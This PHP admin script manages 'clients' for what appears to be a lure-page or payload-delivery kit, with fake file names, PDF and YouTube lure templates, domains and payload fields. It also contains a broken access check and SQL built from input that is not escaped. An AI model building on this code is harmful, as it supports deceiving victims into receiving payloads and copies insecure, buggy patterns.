<?php 

	header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");
	
	include('../config.php');
	include('functions.php');		

	$access = check_login();
	
	if(isset($access) and $access = TRUE){
	
		if(isset($_POST['action']) && $_POST['action'] == 'glitch'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$current_client = mysql_real_escape_string($_POST['current_client']);
			$glitch = intval($_POST['glitch']);
			
			$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `glitch` = '$glitch' WHERE `clients`.`id` = '$current_client' LIMIT 1;";
			mysql_query($sql_csave);
			
			mysql_close($link);
			
		}if(isset($_POST['action']) && $_POST['action'] == 'add_new_pdf'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$cname_uncrypted = mysql_real_escape_string($_POST['cname_uncrypted']);
			$cmethod = mysql_real_escape_string($_POST['cmethod']);
			$clang = mysql_real_escape_string($_POST['clang']);
			$cdomain = mysql_real_escape_string($_POST['cdomain']);
			$cpdf = mysql_real_escape_string($_POST['cpdf']);
			$cpayload = mysql_real_escape_string($_POST['cpayload']);
			$ver = mysql_real_escape_string($_POST['ver']);
			$date = time();
			
			$pattern = '/[-!$#%^&*()_+|~=`{ }\[\]:";\'<>?,\/]/';
			$cname_uncrypted = preg_replace($pattern, "_", $cname_uncrypted);
			$cfakefn = preg_replace($pattern, "_", $cfakefn);
			
			$sql = "SELECT * FROM clients WHERE name = '$cname_uncrypted';";
			if(mysql_num_rows(mysql_query($sql)) != 0){
				echo 'FAILED';
			}else{
				
				$sql_insert_n = "INSERT INTO `".DB_NAME."`.`clients` (`name`,`fakefn`,`date_created`,`template`,`personal`,`method`,`domain`,`lang`,`payload`,`pdf_file`,`ver`) VALUES ('$cname_uncrypted', 'none', '$date', 'none', '0', '$cmethod', '$cdomain', '$clang', '$cpayload', '$cpdf', '$ver');";
				mysql_query($sql_insert_n);
				echo 'SUCCESS';
			}
			
			mysql_close($link);
			
		}elseif(isset($_POST['action']) && $_POST['action'] == 'add_new'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$cpersonal = mysql_real_escape_string($_POST['cpersonal']);
			$cname_uncrypted = mysql_real_escape_string($_POST['cname_uncrypted']);
			$cfakefn = mysql_real_escape_string($_POST['cfakefn']);
			$cmethod = mysql_real_escape_string($_POST['cmethod']);
			$clang = mysql_real_escape_string($_POST['clang']);
			$cdomain = mysql_real_escape_string($_POST['cdomain']);
			$ctemplate = mysql_real_escape_string($_POST['ctemplate']);
			$cpayload = mysql_real_escape_string($_POST['cpayload']);
			$glitch = intval($_POST['glitch']);
			$date = time();
			
			$pattern = '/[-!$#%^&*()_+|~=`{ }\[\]:";\'<>?,\/]/';
			$cname_uncrypted = preg_replace($pattern, "_", $cname_uncrypted);
			$cfakefn = preg_replace($pattern, "_", $cfakefn);
			
			$sql = "SELECT * FROM clients WHERE name = '$cname_uncrypted';";
			if(mysql_num_rows(mysql_query($sql)) != 0){
				echo 'FAILED';
			}else{
			
				if($cpersonal == '0'){
					
					$sql_insert_n = "INSERT INTO `".DB_NAME."`.`clients` (`name`,`fakefn`,`date_created`,`template`,`personal`,`method`,`domain`,`lang`,`payload`,`glitch`) VALUES ('$cname_uncrypted', '$cfakefn', '$date', '$ctemplate', '$cpersonal', '$cmethod', '$cdomain', '$clang', '$cpayload', '$glitch');";
					mysql_query($sql_insert_n);
					echo 'SUCCESS';
					
				}else{
					
					$sql_insert_n = "INSERT INTO `".DB_NAME."`.`clients` (`name`,`fakefn`,`date_created`,`template`,`personal`,`method`,`domain`,`lang`,`payload`,`glitch`) VALUES ('$cname_uncrypted', '$cfakefn', '$date', 'Personal', '$cpersonal', '$cmethod', '$cdomain', '$clang', '$cpayload', '$glitch');";
					mysql_query($sql_insert_n);	
						
					$sql_insert_pt = "INSERT INTO `".DB_NAME."`.`personal_templates` (`client`, `template`) VALUES ('$cname_uncrypted', '$ctemplate');";
					mysql_query($sql_insert_pt);
					echo 'SUCCESS';
				}
				
			}
			
			mysql_close($link);
			
		}elseif(isset($_POST['action']) == 'remove' && isset($_POST['name'])){
			
			$cname_uncrypted = clear_salt($_POST['name']);
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$sql = "SELECT * FROM clients WHERE id = '$cname_uncrypted' LIMIT 1;";
			$do = mysql_query($sql);
			$res = mysql_fetch_array($do);
			$cname = $res['name'];
			
			$sql_remove_f_clients = "DELETE FROM `".DB_NAME."`.`clients` WHERE `clients`.`id` = '$cname_uncrypted' LIMIT 1;";			
			$sql_remove_f_ptemplates = "DELETE FROM `".DB_NAME."`.`personal_templates` WHERE `personal_templates`.`client` = '$cname' LIMIT 1;";			
			$sql_clear_statistics = "DELETE FROM `".DB_NAME."`.`statistics` WHERE `statistics`.`client` = '$cname';";
			
			mysql_query($sql_remove_f_clients);
			mysql_query($sql_remove_f_ptemplates);
			mysql_query($sql_clear_statistics);
			
			mysql_close($link);
			
		}elseif(isset($_POST['action']) && $_POST['action'] == 'save'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$cpersonal = mysql_real_escape_string($_POST['cpersonal']);
			$cname_uncrypted = mysql_real_escape_string($_POST['cname_uncrypted']);
			$cname_crypted = mysql_real_escape_string(clear_salt($_POST['cname_crypted']));
			$cname_current = mysql_real_escape_string($_POST['cname_current']);
			$cfakefn = mysql_real_escape_string($_POST['cfakefn']);
			$cmethod = mysql_real_escape_string($_POST['cmethod']);
			$clang = mysql_real_escape_string($_POST['clang']);
			$cdomain = mysql_real_escape_string($_POST['cdomain']);
			$ctemplate = mysql_real_escape_string($_POST['ctemplate']);
			if(isset($_POST['cpdf'])){
				$cpdf = mysql_real_escape_string($_POST['cpdf']);
			}else{
				$cpdf = 'none';
			}
			
			$cpayload = mysql_real_escape_string($_POST['cpayload']);		
			
			$pattern = '/[-!$#%^&*()_+|~=`{ }\[\]:";\'<>?,\/]/';
			$cname_uncrypted = preg_replace($pattern, "_", $cname_uncrypted);
			$cfakefn = preg_replace($pattern, "_", $cfakefn);
			
			$sql = "SELECT * FROM clients WHERE name = '$cname_uncrypted'";
			if(mysql_num_rows(mysql_query($sql)) != 0){
				if($cname_uncrypted == $cname_current){
					if($cpersonal == '0'){
						$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `name` = '$cname_uncrypted', `fakefn` = '$cfakefn', `template` = '$ctemplate', `personal` = '$cpersonal', `method` = '$cmethod', `domain` = '$cdomain', `lang` = '$clang', `payload` = '$cpayload', `pdf_file` = '$cpdf' WHERE `clients`.`id` = '$cname_crypted' LIMIT 1;";
						mysql_query($sql_csave);
						echo 'SUCCESS';
					}else{
						$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `name` = '$cname_uncrypted', `fakefn` = '$cfakefn', `template` = 'Personal', `personal` = '$cpersonal', `method` = '$cmethod', `domain` = '$cdomain', `lang` = '$clang', `payload` = '$cpayload' WHERE `clients`.`id` = '$cname_crypted' LIMIT 1;";
						mysql_query($sql_csave);
						$sql_tget = "SELECT * FROM personal_templates WHERE client = '$cname_crypted'";
						$do_tget = mysql_query($sql_tget);
						if(mysql_num_rows($do_tget) == 0){
							$sql_insert = "INSERT INTO `".DB_NAME."`.`personal_templates` (`client`, `template`) VALUES ('$cname_crypted', '$ctemplate');";
							mysql_query($sql_insert);
						}else{
							$sql_tupd = "UPDATE `".DB_NAME."`.`personal_templates` SET `template` = '$ctemplate', `client` = '$cname_uncrypted' WHERE `personal_templates`.`client` = '$cname_crypted' LIMIT 1;";
							mysql_query($sql_tupd);
						}
						echo 'SUCCESS';
					}
				}else{
					echo 'FAILED';
				}
			}else{
				if($cpersonal == '0'){
					$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `name` = '$cname_uncrypted', `fakefn` = '$cfakefn', `template` = '$ctemplate', `personal` = '$cpersonal', `method` = '$cmethod', `domain` = '$cdomain', `lang` = '$clang', `payload` = '$cpayload', `pdf_file` = '$cpdf' WHERE `clients`.`id` = '$cname_crypted' LIMIT 1;";
					mysql_query($sql_csave);
					echo 'SUCCESS';
				}else{
					$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `name` = '$cname_uncrypted', `fakefn` = '$cfakefn', `template` = 'Personal', `personal` = '$cpersonal', `method` = '$cmethod', `domain` = '$cdomain', `lang` = '$clang', `payload` = '$cpayload' WHERE `clients`.`id` = '$cname_crypted' LIMIT 1;";
					mysql_query($sql_csave);
					$sql_tget = "SELECT * FROM personal_templates WHERE client = '$cname_crypted'";
					$do_tget = mysql_query($sql_tget);
					if(mysql_num_rows($do_tget) == 0){
						$sql_insert = "INSERT INTO `".DB_NAME."`.`personal_templates` (`client`, `template`) VALUES ('$cname_crypted', '$ctemplate');";
						mysql_query($sql_insert);
					}else{
						$sql_tupd = "UPDATE `".DB_NAME."`.`personal_templates` SET `template` = '$ctemplate', `client` = '$cname_uncrypted' WHERE `personal_templates`.`client` = '$cname_crypted' LIMIT 1;";
						mysql_query($sql_tupd);
					}
					echo 'SUCCESS';
				}
			}
			
			mysql_close($link);
			
		}elseif(isset($_GET['name']) && !isset($_GET['action']) && is_scalar($_GET['name'])){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");		
		
			$c_name_uncr = strip_tags(clear_salt($_GET['name']));
			$c_name_uncr = htmlspecialchars($c_name_uncr);
			$c_name_uncr = mysql_real_escape_string($c_name_uncr);
			
			$c_name = strip_tags($_GET['name']);
			$c_name = htmlspecialchars($c_name);
			$c_name = mysql_real_escape_string($c_name);
			
			$sql_query = "SELECT * FROM clients WHERE id = '$c_name_uncr'";	
			$do = mysql_query($sql_query);
			
			if(mysql_num_rows($do) != 0){
			
				$result = mysql_fetch_array($do);
				
				if($result['method'] != 'PDF'){			
					@require('./tpl/client_view.tpl');					
				}else{					
					@require('./tpl/client_view_pdf.tpl');					
				}
				
			}else{
				@header("Location:./index");
				exit();
			}
			
			mysql_close($link);
			
		}elseif(!isset($_GET['name']) && isset($_GET['action']) && $_GET['action'] == 'new'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			
				@require('./tpl/new_we.tpl');
			
			mysql_close($link);
			
		}elseif(!isset($_GET['name']) && isset($_GET['action']) && $_GET['action'] == 'new-youtube'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			
				@require('./tpl/new_youtube.tpl');
			
			mysql_close($link);
			
		}elseif(!isset($_GET['name']) && isset($_GET['action']) && $_GET['action'] == 'new-pdf_v1'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			
				@require('./tpl/new_pdf_v1.tpl');
			
			mysql_close($link);
			
		}elseif(!isset($_GET['name']) && isset($_GET['action']) && $_GET['action'] == 'new-pdf_v2'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			
				@require('./tpl/new_pdf_v2.tpl');
			
			mysql_close($link);
			
		}elseif(!isset($_GET['name']) && isset($_GET['action']) && $_GET['action'] == 'new-pdf_v3'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			
				@require('./tpl/new_pdf_v3.tpl');
			
			mysql_close($link);
			
		}else{
			@header("Location:./index");
			exit();
		}
	
	}else{
		@header("Location: ../login");
		exit();
	}
?>
